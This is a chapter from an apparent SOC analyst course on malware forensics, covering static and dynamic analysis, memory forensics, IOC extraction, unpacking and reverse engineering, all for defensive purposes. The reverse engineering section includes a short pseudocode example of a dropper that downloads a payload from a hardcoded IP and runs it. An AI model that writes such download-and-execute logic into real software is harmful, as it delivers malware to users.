  ## Introduction

Malware forensics is the process of dissecting malicious binaries to understand their behavior, purpose, and potential impact on a system or network
As a SOC Analyst, your goal isn’t always to reverse-engineer malware from scratch — but to understand what it does, how it got in, what it affected, and how to respond

Malware forensics bridges the gap between incident response and reverse engineering. This chapter focuses on how to perform malware triage, dynamic and static analysis, and collect actionable intelligence

## The Malware Analysis Workflow

1. **Collection** – Obtain the binary safely ( from sandbox, EDR quarantine, memory dump, etc )
2. **Preparation** – Set up an isolated analysis environment (VM or sandbox)
3. **Static Analysis** – Examine the binary without running it
4. **Dynamic Analysis** – Execute it in a controlled environment to observe real behavior
5. **Behavioral Forensics** – Trace what files, registry keys, and network indicators it creates
6. **Reporting & IOC Extraction** – Summarize findings into indicators for detection or hunting

## Malware Execution Chain

<pre>
[Initial Infection] --> [Dropper / Exploit] --> [Unpack/Decrypt] --> [Launcher/Loader]
         |                  |                             |                    |
         v                  v                             v                    v
[Persistence] <------ [Staging] <--------------- [In-memory Payload] -> [C2 Communication]
                          |                                                 |
                          v                                                 v
                   [Lateral Movement] ----------------------------> [Exfiltration]
</pre>

## Safe Analysis Environment

Never analyze malware on your host OS. Always use:

- Isolated Virtual Machines ( VMware, VirtualBox, or KVM )
- Snapshots for quick rollback
- No shared clipboard or folders
- Disabled network adapter ( or use a simulated internet setup )


### Recommended Tools
- **Remnux** (Linux-based reverse engineering distro)
- **Flare VM** (Windows reverse engineering suite)
- **Cuckoo Sandbox** or **Any.Run** for automated analysis
- [Wireshark](/courseFiles/tools/wireshark.md), **Procmon**, **Regshot**, **Autoruns**, **PEStudio**, **x64dbg**


## Static Analysis
### Goal
Understand the binary’s structure, type, and metadata without executing it

### Key Steps

1. **Identify File Type**

```bash
file sample.exe
```

Or tools like **PEview**

Identify:
- File format (PE, ELF, Mach-O)
- Architecture (x86, x64)
- Packed or obfuscated?

<br>

2. **Hashing**
Calculate hashes for identification:

```bash
sha256sum sample.exe
md5sum sample.exe
```

Use sites like **VirusTotal**, **Hybrid Analysis**, and **MalwareBazaar** to check known detections and metadata

<br>

3. **Strings Analysis**

Extract readable text:

```bash
strings sample.exe | less
```

Look for:
- **URLs**, **IPs**, **domains**
- **Registry keys**
- **File paths**
- **Function names**
- **Obfuscation hints** (“This program cannot be run in DOS mode”, etc)

<br>

4. **PE Header Analysis**

Use **PEStudio** or **CFF Explorer** to check:
- **Imports** ( WinAPI functions )
- **Sections** ( `.text`, `.rdata`, `.data`, `.rsrc` )
- **Anomalies** ( suspicious section names, large entropy, packed sections )

Common API indicators:

| Function  | Likely Purpose |
| ------------- | ------------- |
| `CreateFile`, `WriteFile`  | File system activity |
| `RegSetValueEx` | Registry modification |
| `WinExec`, `ShellExecute` | Command execution |
| `InternetOpenURL`, `connect` | Network connections |
| `VirtualAlloc`, `WriteProcessMemory` | Code injection or unpacking |

<br>

## Dynamic Analysis

**Goal:**

Observe the binary’s real-time behavior to identify indicators and persistence mechanisms

1. **System Monitoring**

Tools:
- **Process Monitor** (Procmon) – tracks file, registry, and process activity
- **Process Explorer** – shows running processes and loaded modules
- **Regshot** – snapshots of registry before/after execution
- [Wireshark](/courseFiles/tools/wireshark.md) – captures network activity
- **ApateDNS** or **INetSim** – simulate DNS or network responses safely


<br>

2. **Typical Behaviors to Observe**

| Activity  | Example |
| ------------- | ------------- |
| File drops | Creates temp or hidden files |
| Persistence | Adds registry run keys |
| Network | C2 beaconing, DNS tunneling |
| Privilege Escalation | Uses `SeDebugPrivilege` or exploits |
| Evasion | Checks for VM, sandbox, debugger |

<br>

3. **Memory Analysis**

When malware runs only in memory or injects code elsewhere, use:

[Volatility3](/courseFiles/tools/Volatility.md) or **Rekall** to analyze memory dumps

For instructions on how to do it, check the volatility documentation linked above

Identify injected DLLs, hidden processes, or C2 configuration strings

<br>

## Behavioral Forensics and IOC(Indicators Of Compomise) Extraction

From both static and dynamic phases, extract **Indicators of Compromise (IOCs)**:

- File hashes (MD5/SHA256)
- Filenames / paths
- Mutexes
- Registry keys
- IP addresses / domains
- HTTP user agents
- Network ports

Example:

```
File: sample.exe
SHA256: 4fa0cde08d59d8c6d6a3b3...
Drops: C:\Users\Public\msconfig.exe
Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\msupdate
Network: 185.203.118.7:8080
```

Store IOCs in your threat intel repository ( MISP, OpenCTI, or Sigma rules )

## Basic Unpacking and Deobfuscation
Many malware samples are packed to hide code. Common packers: UPX, Themida, ASPack

- **Detecting a Packer**

Check entropy ( using **PEStudio** or **Detect It Easy** )

Entropy > 7.0 = likely packed

- **Simple Unpacking**

If UPX:

```bash
upx -d sample.exe
```

Otherwise, run the malware in debugger ( **x64dbg** ) and dump unpacked memory using **Scylla** or **PE-sieve**



## Reverse Engineering

**Reverse engineering** (RE) in malware analysis means disassembling or decompiling an executable to understand its internal logic, functions, and hidden behaviors

While full RE is typically the work of a malware researcher, a **SOC analyst who understands the fundamentals** can recognize obfuscation, extract deeper IOCs, and communicate intelligently with threat intel teams

### Goals of Reverse Engineering in a SOC Context

- The purpose isn’t to rewrite or fully decompile the code - it’s to answer tactical questions: 
- What does this binary do when executed?
- How does it persist?
- What data does it collect or exfiltrate?
- What encryption or obfuscation is used?
- Are there hardcoded IPs, domains, or credentials?

Reverse engineering helps bridge the gap between “**it’s malicious**” and “**this is exactly what it does and how to stop it.**”


### Required Environment

You’ll need a **dedicated analysis VM** (never your host) equipped with:
- [IDA Free](/courseFiles/tools/IDA_Free.md), **Ghidra**, or [Binary Ninja](/courseFiles/tools/Binary_Ninja.md)
- **x64dbg** or **OllyDbg** for debugging
- **Scylla** or **PE-sieve** for dumping unpacked binaries
- **Detect It Easy** ( **DIE** ) for identifying packers
- **Python** + **Hex editors** (**HxD**, **010 Editor**)

### Understanding Executable Internals

A typical Windows binary (PE file) contains:

- `.text` – actual code section
- `.rdata` – read-only data (strings, imports)
- `.data` – writable data
- `.rsrc` – embedded resources (icons, config files, sometimes encrypted payloads)
- `.reloc`, .pdata, etc. – less relevant for initial analysis

Indicators like high entropy in `.text` or custom section names (`.aspack`, `.xyz`, `.enc`) suggest packing or obfuscation

### Decompilation and Code Understanding

Modern tools ( **Ghidra**, **IDA Pro**, [Binary Ninja](/courseFiles/tools/Binary_Ninja.md) ) can decompile binary code into near **C-like pseudocode**

This lets you see what the code probably did before compilation

Example pseudocode from Ghidra:

```c
int main() {
    char *url = "http://185.91.100.23/payload.exe";
    DownloadFile(url, "C:\\Users\\Public\\update.exe");
    ExecuteFile("C:\\Users\\Public\\update.exe");
}
```

This immediately reveals:
- Hardcoded C2
- File download behavior
- Secondary payload dropper

Even partial recovery of code like this is enough for IOC extraction and detection rule creation

### Common Anti-Analysis Techniques

Malware authors use tricks to frustrate analysts

| Technique | Description | Countermeasure |
| ------------- | ------------- | ------------- |
| **Packing** | Compress/encrypt code to hide logic | Use DIE, unpack in-memory |
| **API hashing** | Hides API names | Look for hashing loops and compare to known tables |
| **String encryption** | Encrypts URLs/domains | Use breakpoints around decryption routines |
| **Anti-debug** | Detects debugger presence | Patch `IsDebuggerPresent()` return value |
| **Anti-VM** | Checks for VM artifacts | Mask registry entries or MAC addresses |
| **Code injection** | Injects code into legit processes | Use Procmon + [Volatility3](/courseFiles/tools/Volatility.md) to detect targets |


***
<b><i>Continuing the course?</b>
</br>
[Click here for the Next Section](/courseFiles/Section_12-documentationAndCaseNotes/documentationAndCaseNotes.md)</i>

<b><i>Want to go back?</b>
</br>
[Click here for the Previous Section](/courseFiles/Section_10-emailFundamentals/emailFundamentals.md)

<b><i>Looking for a different section? </b></br>[Back to Section Directory](/coursenavigation.md)</i>















